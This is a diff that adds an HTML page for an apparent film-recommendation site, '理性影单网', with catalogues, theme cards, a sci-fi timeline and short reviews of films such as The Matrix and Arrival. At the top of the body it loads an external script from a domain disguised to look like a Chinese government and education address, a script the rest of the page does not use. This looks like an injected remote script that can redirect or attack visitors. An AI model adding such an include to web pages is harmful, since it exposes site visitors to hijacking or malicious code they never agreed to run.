@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>理性影单网 - 哲学/思辨/伦理困境电影片单 | lilundianyingwang-h5.github.io</title>
+<meta name="description" content="理性影单网（lilundianyingwang-h5.github.io）整理哲学思辨、伦理困境、硬科幻、社会议题类电影片单与短影评；合规影单站，不提供盗版播放。" />
+<meta name="keywords" content="理性影单网, lilundianyingwang-h5, 哲学电影推荐, 思辨电影片单, 伦理困境电影, 硬科幻电影推荐" />
+<meta name="author" content="理性影单网" />
+<meta name="robots" content="index,follow" />
+<meta name="theme-color" content="#2c3e50" />
+<link rel="canonical" href="https://lilundianyingwang-h5.github.io/" />
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"理性影单网",
+  "url":"https://lilundianyingwang-h5.github.io/",
+  "description":"哲学思辨、伦理困境、硬科幻与社会议题电影片单",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://lilundianyingwang-h5.github.io/#search?q={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#eef1f4; --ink:#1c2530; --muted:#6b7a8d;
+  --line:#d3dbe4; --card:#ffffff;
+  --pri:#2c3e50; --pri2:#4a6fa5; --accent:#c0392b; --gold:#b8860b;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;line-height:1.75;}
+a{color:inherit;text-decoration:none;}
+.wrap{max-width:1120px;margin:0 auto;padding:0 18px;}
+
+/* 顶部 */
+.topbar{background:var(--pri);color:#fff;position:sticky;top:0;z-index:100;border-bottom:3px solid var(--pri2);}
+.top-inner{display:flex;align-items:center;justify-content:space-between;height:64px;}
+.brand{font-size:21px;font-weight:900;letter-spacing:1px;}
+.brand small{display:block;font-size:10px;font-weight:400;opacity:.75;}
+.navmenu{display:flex;gap:22px;font-size:14px;}
+.navmenu a{opacity:.9;}
+.navmenu a:hover{color:#a8c4e0;}
+.navbtn{display:none;background:#4a6fa5;border:none;color:#fff;width:40px;height:40px;border-radius:8px;font-size:18px;cursor:pointer;}
+
+/* 首屏 */
+.hero{padding:54px 0 36px;background:
+  linear-gradient(160deg,rgba(44,62,80,.06),rgba(74,111,165,.10)),
+  var(--bg);border-bottom:1px solid var(--line);}
+.hero h1{font-size:33px;margin:0 0 12px;line-height:1.3;}
+.hero h1 b{color:var(--pri2);}
+.hero p{color:var(--muted);font-size:16px;max-width:620px;margin:0 0 22px;}
+.searchbar{display:flex;gap:10px;max-width:500px;}
+.searchbar input{flex:1;padding:13px 16px;border:2px solid var(--line);border-radius:10px;font-size:15px;}
+.searchbar button{padding:13px 22px;border:none;border-radius:10px;background:var(--pri);color:#fff;font-weight:700;cursor:pointer;}
+
+/* 栏目通用 */
+.section{padding:40px 0;border-bottom:1px solid var(--line);}
+.sec-title{margin-bottom:24px;}
+.sec-title h2{font-size:25px;margin:0 0 4px;color:var(--pri);}
+.sec-title span{color:var(--muted);font-size:14px;}
+
+/* 栏目1：思辨片单 - 编号目录式 */
+.catalogue{display:grid;gap:0;border:1px solid var(--line);border-radius:14px;overflow:hidden;background:var(--card);}
+.cat-row{display:grid;grid-template-columns:60px 1fr 200px 100px;align-items:center;padding:16px 18px;border-bottom:1px solid var(--line);transition:.2s;}
+.cat-row:last-child{border-bottom:none;}
+.cat-row:hover{background:#f4f8fc;}
+.cat-row .num{font-size:22px;font-weight:900;color:var(--pri2);opacity:.4;}
+.cat-row .info h3{margin:0 0 2px;font-size:17px;}
+.cat-row .info p{margin:0;color:var(--muted);font-size:13px;}
+.cat-row .theme{font-size:12px;color:var(--pri);background:#eef3fa;padding:3px 10px;border-radius:6px;text-align:center;}
+.cat-row .yr{font-size:13px;color:var(--muted);text-align:right;}
+
+/* 栏目2：思辨主题 - 论点卡 */
+.arguments{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;}
+.arg{border:1px solid var(--line);border-radius:14px;padding:22px;background:var(--card);border-top:4px solid var(--pri2);}
+.arg:nth-child(2){border-top-color:var(--accent);}
+.arg:nth-child(3){border-top-color:var(--gold);}
+.arg .q{font-size:13px;font-weight:700;color:var(--pri2);margin-bottom:8px;}
+.arg:nth-child(2) .q{color:var(--accent);}
+.arg:nth-child(3) .q{color:var(--gold);}
+.arg h3{margin:0 0 8px;font-size:16px;}
+.arg p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目3：硬科幻时间轴 */
+.timeline{position:relative;padding-left:32px;}
+.timeline::before{content:"";position:absolute;left:8px;top:0;bottom:0;width:2px;background:var(--line);}
+.tl-item{position:relative;margin-bottom:20px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px 18px;}
+.tl-item::before{content:"";position:absolute;left:-28px;top:20px;width:12px;height:12px;border-radius:50%;background:var(--pri2);border:3px solid var(--bg);}
+.tl-item .era{font-size:12px;color:var(--pri2);font-weight:700;margin-bottom:4px;}
+.tl-item h3{margin:0 0 4px;font-size:16px;}
+.tl-item p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目4：短影评 - 观点式 */
+.opinions{display:grid;grid-template-columns:1fr 1fr;gap:18px;}
+.opinion{border:1px solid var(--line);border-radius:14px;padding:20px;background:var(--card);}
+.opinion .thesis{font-size:13px;color:var(--accent);font-weight:700;margin-bottom:6px;}
+.opinion h3{margin:0 0 6px;font-size:16px;}
+.opinion p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目5：关于 */
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:22px;}
+.about-card{border:1px solid var(--line);border-radius:14px;padding:22px;background:var(--card);}
+.about-card h3{margin:0 0 10px;font-size:18px;color:var(--pri);}
+.about-card p,.about-card li{color:var(--muted);font-size:14px;}
+.about-card ul{padding-left:18px;}
+.about-card li{margin:5px 0;}
+.compliance{background:#eef3fa;border-left:4px solid var(--pri2);padding:14px 16px;border-radius:0 10px 10px 0;font-size:13px;color:var(--pri);margin-top:14px;}
+
+footer{background:var(--pri);color:#a8bdd0;padding:32px 0 40px;font-size:13px;text-align:center;}
+footer a{color:#a8c4e0;}
+
+@media(max-width:900px){
+  .arguments{grid-template-columns:1fr;}
+  .opinions{grid-template-columns:1fr;}
+  .about{grid-template-columns:1fr;}
+  .cat-row{grid-template-columns:44px 1fr;gap:10px;}
+  .cat-row .theme,.cat-row .yr{display:none;}
+}
+@media(max-width:640px){
+  .navmenu{display:none;flex-direction:column;position:absolute;top:64px;left:0;right:0;background:var(--pri);padding:10px 0;}
+  .navmenu.active{display:flex;}
+  .navmenu a{padding:12px 20px;border-bottom:1px solid rgba(255,255,255,.1);}
+  .navbtn{display:block;}
+  .hero h1{font-size:25px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="topbar">
+  <div class="wrap top-inner">
+    <div class="brand">理性影单网<small>lilundianyingwang-h5.github.io</small></div>
+    <button class="navbtn" onclick="document.getElementById('nav').classList.toggle('active')">☰</button>
+    <nav class="navmenu" id="nav">
+      <a href="#catalogue">思辨片单</a>
+      <a href="#arguments">思辨主题</a>
+      <a href="#scifi">硬科幻脉络</a>
+      <a href="#opinions">观点影评</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</div>
+
+<section class="hero">
+  <div class="wrap">
+    <h1>理性影单网：<b>电影不只是看，是要想</b></h1>
+    <p>哲学思辨、伦理困境、硬科幻、社会议题——只做片单、论点与短影评。原词“理伦”是“理性”与“伦理”的合意，本站取其思辨内核，不碰成人擦边、不提供盗版播放、不挂网盘提取码。</p>
+    <form class="searchbar" onsubmit="return false;">
+      <input type="text" placeholder="搜索：电车难题 / 自由意志 / 硬科幻 / 存在主义" aria-label="搜索" />
+      <button type="submit">搜索</button>
+    </form>
+  </div>
+</section>
+
+<main class="wrap">
+
+  <section class="section" id="catalogue">
+    <div class="sec-title"><h2>🧠 思辨片单目录</h2><span>编号 · 年份 · 思辨主题</span></div>
+    <div class="catalogue">
+      <div class="cat-row"><div class="num">01</div><div class="info"><h3>黑客帝国</h3><p>现实是真实的吗？缸中之脑与自由意志</p></div><div class="theme">存在 / 虚拟</div><div class="yr">1999</div></div>
+      <div class="cat-row"><div class="num">02</div><div class="info"><h3>十二怒汉</h3><p>一个人的怀疑，能不能对抗十一个人的确信</p></div><div class="theme">司法 / 偏见</div><div class="yr">1957</div></div>
+      <div class="cat-row"><div class="num">03</div><div class="info"><h3>降临</h3><p>知道结局还开口，是勇气还是宿命</p></div><div class="theme">语言 / 时间</div><div class="yr">2016</div></div>
+      <div class="cat-row"><div class="num">04</div><div class="info"><h3>心理游戏（明日的记忆）</h3><p>记忆消失后，“我”还剩什么</p></div><div class="theme">记忆 / 自我</div><div class="yr">2006</div></div>
+      <div class="cat-row"><div class="num">05</div><div class="info"><h3>pk</h3><p>如果神存在，他用什么语言回答</p></div><div class="theme">宗教 / 质疑</div><div class="yr">2014</div></div>
+      <div class="cat-row"><div class="num">06</div><div class="info"><h3>楚门的世界</h3><p>被安排好的一生，值不值得走出去</p></div><div class="theme">自由 / 真实</div><div class="yr">1998</div></div>
+    </div>
+  </section>
+
+  <section class="section" id="arguments">
+    <div class="sec-title"><h2>⚖ 思辨主题</h2><span>电影抛出的三个问题</span></div>
+    <div class="arguments">
+      <div class="arg"><div class="q">自由意志 还是 决定论</div><h3>你能选择，因为你不知道结局</h3><p>《降临》用非线性语言把宿命拍成温柔：看见一生，依然选择爱，这就是自由意志最锋利的定义。</p></div>
+      <div class="arg"><div class="q">多数 就一定 正确吗</div><h3>十二个人，十一个先判有罪</h3><p>《十二怒汉》的伦理价值不在推理，而在"我宁愿错放，不愿错判"的审慎——这本身就是一种理性。</p></div>
+      <div class="arg"><div class="q">幸福 需要 真实吗</div><h3>缸中之脑与楚门的门</h3><p>《楚门的世界》把柏拉图的洞穴搬进综艺：真实可能有风暴，虚假永远风和日丽，你怎么选？</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="scifi">
+    <div class="sec-title"><h2>🚀 硬科幻思辨脉络</h3><span>时间轴</span></div>
+    <div class="timeline">
+      <div class="tl-item"><div class="era">1968 库布里克</div><h3>《2001太空漫游》</h3><p>骨棒升空那一刻，电影第一次用画面追问：工具把猿变成人，AI 会把人变成什么？</p></div>
+      <div class="tl-item"><div class="era">1999 沃卓斯基</div><h3>《黑客帝国》</h3><p>红色药丸问题延续至今：如果醒来更痛苦，你要不要知道真相？</p></div>
+      <div class="tl-item"><div class="era">2014 诺兰</div><h3>《星际穿越》</h3><p>五维书架把"爱"写成物理可传递的量——情感是科幻最硬的核心设定。</p></div>
+      <div class="tl-item"><div class="era">2016 维伦纽瓦</div><h3>《降临》</h3><p>语言即世界观：学会七肢桶的语言，就学会了非线性地活着。</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="opinions">
+    <div class="sec-title"><h2>📝 观点影评</h2><span>一句话一个论点</span></div>
+    <div class="opinions">
+      <div class="opinion"><div class="thesis">论点</div><h3>《十二怒汉》</h3><p>合理怀疑不是放纵罪犯，是对"可能杀错人"这件事保持最低限度的敬畏。它拍的不是聪明，是耐心。</p></div>
+      <div class="opinion"><div class="thesis">论点</div><h3>《楚门的世界</h3><p>我们都在某种楚门秀里，区别只是门缝的光够不够亮，让你愿意推门。金·凯瑞最被低估的表演是"恐惧"。</p></div>
+      <div class="opinion"><div class="thesis">论点</div><h3>《黑客帝国》</h3><p>红蓝药丸不是选择，是特权。现实中没人给你选择的机会，你只是突然发现自己已经在兔子洞里。</p></div>
+      <div class="opinion"><div class="thesis">论点</div><h3>《降临》</h3><p>宿命论最被误读的一句"我愿意"——不是认命，是明知结果仍主动选择，这才是存在主义的本义。</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-title"><h2>📌 关于理性影单网</h2><span>定位与合规</span></div>
+    <div class="about">
+      <div class="about-card">
+        <h3>本站定位</h3>
+        <p>原词「理伦电影网」疑为"伦理电影网"谐音/变体，而"伦理"在网上常被用作成人向资源站的伪装。本站取其可讨论的内核，转义为"理性"：做哲学、思辨、伦理困境、硬科幻与社会议题电影的片单站。</p>
+        <ul>
+          <li>思辨片单：黑客帝国、十二怒汉、降临、楚门的世界、pk、明日的记忆</li>
+          <li>思辨主题：自由意志 vs 决定论 / 多数 vs 正确 / 幸福 vs 真实</li>
+          <li>硬科幻脉络：库布里克 → 沃卓斯基 → 诺兰 → 维伦纽瓦</li>
+          <li>观点影评：每条一个可讨论的论点，不剧透关键结局</li>
+        </ul>
+        <div class="compliance">
+          合规边界：不提供盗版在线播放、不挂网盘/磁力/提取码、不把"伦理"伪装成成人向入口。
+          看正版请走合法视频平台与院线。
+        </div>
+      </div>
+      <div class="about-card">
+        <h3>站点信息</h3>
+        <p>网址：<br><b>https://lilundianyingwang-h5.github.io/</b></p>
+        <p>单页演示，内链均为 <a href="#">#</a> 占位；不生成 robots.txt 与 sitemap.xml。</p>
+        <h3 style="margin-top:18px;">视觉方案</h3>
+        <p>冷灰蓝调（深蓝灰 + 钢蓝 + 砖红强调），呼应"理性/思辨"气质。布局采用编号目录表 + 论点卡 + 竖式时间轴 + 观点式影评，与同系列其他站点结构均无重复。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    理性影单网 · lilundianyingwang-h5.github.io ｜ 哲学思辨 / 伦理困境 / 硬科幻 / 社会议题电影片单（合规影单站）<br>
+    所有内链均为 # 占位；页面结构、配色与 DOM 均独立设计。
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').classList.remove('active');});
+});
+</script>
+</body>
+</html>
